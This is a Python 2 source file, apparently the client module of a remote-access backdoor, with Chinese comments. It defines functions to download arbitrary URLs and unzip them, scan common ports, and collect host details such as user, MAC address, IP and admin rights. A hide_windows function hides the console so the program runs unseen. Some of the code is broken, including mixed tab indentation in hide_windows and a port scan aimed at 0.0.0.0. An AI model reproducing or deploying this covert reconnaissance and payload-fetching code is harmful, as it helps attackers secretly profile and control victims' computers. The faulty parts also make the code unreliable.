# -*- coding: UTF-8 -*-
import datetime
import os
import sys
import urllib
import zipfile
import socket

import ctypes
import getpass
import platform
import time
import uuid


# ------------------ 解压 ------------------
def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return 'File {} extracted.'.format(f)
        except zipfile.BadZipfile:
            return 'Error: Failed to unzip file.'
    else:
        return 'Error: File not found.'


# ------------------ wget 下载 ------------------
def wget(url):
    if not url.startswith('http'):
        return 'Error: URL must begin with http:// or https:// .'

    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)

    try:
        urllib.urlretrieve(url, fname)
    except IOError:
        return 'Error: Download failed.'

    return 'File {} downloaded.'.format(fname)


# ------------------ 扫描客户端 IP 的端口情况 ------------------
def scan():
    PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
            514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]

    ip = '0.0.0.0'
    results = ''

    for p in PORTS:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c = s.connect_ex((ip, p))
        socket.setdefaulttimeout(0.5)

        state = 'open' if not c else 'closed'

        results += '{:>5}/tcp {:>7}\n'.format(p, state)

    return results.rstrip()


# ------------------ 获取客户端机器信息 ------------------
def info(plat):
    
    INFO_FORMAT = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Internal IP         - {}
    MAC Address         - {}
    Internal Hostname   - {}
    External Hostname   - {}
    Hostname Aliases    - {}
    FQDN                - {}
    Current User        - {}
    System Datetime     - {}
    Admin Access        - {}
    '''

    # 操作系统名称及版本号
    sys_platform = platform.platform()
    # 处理器
    processor    = platform.processor()
    # 操作系统位数
    architecture = platform.architecture()[0]

    # 登录名
    username = getpass.getuser()

    hostname    = socket.gethostname()
    fqdn        = socket.getfqdn()
    internal_ip = socket.gethostbyname(hostname)
    raw_mac     = uuid.getnode()
    mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))

    # 外网 IP（有点慢
    '''
    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw',
                   'wtfismyip.com/text' ]
    external_ip = ''
    for url in ex_ip_grab:
        try:
            external_ip = urllib.urlopen('http://'+url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break
    '''
    
    # reverse dns lookup
    try:
        ext_hostname, aliases, _ = socket.gethostbyaddr(external_ip)
    except (socket.herror, NameError):
        ext_hostname, aliases = '', []
    aliases = ', '.join(aliases)

    # 时间、时区
    dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
         time.localtime())

    is_admin = False
    if plat == 'win':
        # 是否有管理员权限
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat in ['nix', 'mac']:
        is_admin = os.getuid() == 0

    admin_access = 'Yes' if is_admin else 'No'

    # 返回结果
    return INFO_FORMAT.format(sys_platform, processor, architecture, 
                            internal_ip, mac, hostname, ext_hostname, 
                            aliases, fqdn, username, dt, admin_access)


# ------------------ 隐藏窗口 ------------------
def hide_windows(h = 1):
    if h == 1:
        window = ctypes.windll.kernel32.GetConsoleWindow()
        if window != 0:
            ctypes.windll.user32.ShowWindow(window, 0)
            ctypes.windll.kernel32.CloseHandle(window)

	else:
		print("Warning: windows are showen.")

'''
    try:
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True

    except:
        return False
'''